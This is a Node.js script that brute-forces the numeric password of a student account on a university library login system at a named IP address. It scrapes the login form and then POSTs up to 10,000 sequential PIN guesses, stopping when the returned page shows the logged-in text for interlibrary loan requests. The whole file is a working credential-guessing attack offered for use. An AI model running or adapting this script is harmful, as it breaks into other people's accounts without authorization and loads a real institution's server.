'use strict';
var http = require('http');
var sync_request = require('sync-request');
var querystring = require('querystring');
var student_id = '';
var password = '';
student_id = process.argv[2];
password = process.argv[3];
var post_obj = {
	'func':'login-session',
	'login_source':'bor-info',
	'bor_id':student_id.toString(),
	'bor_verification':password.toString(),
	'bor_library':'ZSU50'
}
var options = {
  hostname: '202.116.64.108',
  port: 8991,
  path: '/F/2NQJ13MXLCVJMVDK42YXFHFPL1VIV4L14L49R4QFBVCX2RA892-16682',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': ''
 }
  // User-Agent:"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
};
// var now = (parseInt(password) + parseInt(i)).toString();
// post_obj.password = now;
// var post_data = querystring.stringify(post_obj);
// options.headers['Content-Length'] = post_data.length;
// var post_req = http.request(options, function(res) {
//   res.setEncoding('utf8');
//   res.on('data', function (chunk) {
//   	  chunk.toString('utf8');
//   	  if (chunk.search(/激活的馆际互借请求/) > -1) {
//   	  	console.log('success! ' + now);
//   	  	ok = true;
//   	  } else {
//   	  	// console.log('failed');
//   	  }
//       // console.log('Response: ' + chunk);

//   });
// });
// post_req.write(post_data);
// post_req.end();
var res = sync_request('GET', 'http://202.116.64.108:8991/F/');
var body = res.getBody('utf8');
var arr = /<a href="(.*?)" class="blue" title="输入用户名和密码">/.exec(body);
console.log(arr[1]);
var res = sync_request('GET', arr[1]);
body = res.getBody('utf8');
arr = /action="(.*?)">/.exec(body);
console.log(arr[1]);
// <form method=POST 
//       name="form1" 
//       action="http://202.116.64.108:8991/F/HYVIKJ7CUULYR1EAY43BBUUB63PXTDTNVXCHMRV4CPN4JR9F1S-00385"> 
var ok = false;
for (var i = 0; i < 10000 && !ok; i++) {
	var now = (parseInt(password) + parseInt(i)).toString();
	if (now.length < 6) {
		now = '0'+now;
	}
	post_obj['bor_verification'] = now;
	var post_data = querystring.stringify(post_obj);
	options.headers['Content-Length'] = post_data.length;
	var res = sync_request('POST',arr[1], 
	 {  
	 	headers: {
	    'Content-Type': 'application/x-www-form-urlencoded',
	 	},
	 	body: post_data
	 });
	var body = res.getBody('utf8');
	if (body.search(/激活的馆际互借请求/) > -1) {
		console.log('success! ' + now);
		break;
	} else {
		console.log('failed ' + now);
	}
}